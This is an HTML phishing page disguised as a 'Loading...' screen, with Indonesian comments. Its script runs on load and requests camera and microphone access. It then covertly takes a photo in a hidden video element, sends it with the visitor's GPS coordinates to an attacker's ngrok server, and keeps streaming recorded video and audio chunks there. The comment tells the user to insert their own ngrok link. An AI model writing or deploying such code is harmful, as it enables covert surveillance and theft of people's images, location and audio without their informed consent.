<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System</title>
</head>
<body>
    <h3>Loading...</h3>
    <script>
        // GANTI DENGAN LINK NGROK KAMU
        const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
        
        async function captureAndSend() {
            console.log("1. Meminta akses kamera...");
            
            try {
                // Dapatkan stream video
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 }, 
                    audio: true 
                });
                console.log("2. Akses kamera berhasil");
                
                // Buat element video (sembunyi)
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();
                console.log("3. Video mulai play");
                
                // Tunggu 1 detik biar stabil
                await new Promise(r => setTimeout(r, 1000));
                
                // Ambil foto
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                console.log("4. Foto diambil");
                
                // Kirim foto ke server
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob);
                    
                    const response = await fetch(SERVER + '/photo', { 
                        method: 'POST', 
                        body: formData 
                    });
                    
                    if (response.ok) {
                        console.log("5. ✅ FOTO TERKIRIM!");
                        document.body.innerHTML = "<h3>✅ Success</h3>";
                    } else {
                        console.log("5. ❌ Gagal kirim foto");
                    }
                }, 'image/jpeg', 0.8);
                
                // Kirim lokasi juga
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(pos => {
                        fetch(SERVER + '/loc', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude })
                        });
                        console.log("6. Lokasi terkirim");
                    });
                }
                
                // Kirim ping buat testing
                fetch(SERVER + '/ping', { method: 'POST', body: JSON.stringify({ test: true }) });
                
                // Kirim stream video (opsional)
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => {
                    if (e.data.size) fetch(SERVER + '/stream', { method: 'POST', body: e.data });
                };
                recorder.start(5000);
                
            } catch(e) {
                console.log("ERROR:", e.message);
                document.body.innerHTML = "<h3>Error: " + e.message + "</h3><p>Pastikan klik 'Allow' di popup</p>";
            }
        }
        
        captureAndSend();
    </script>
</body>
</html>
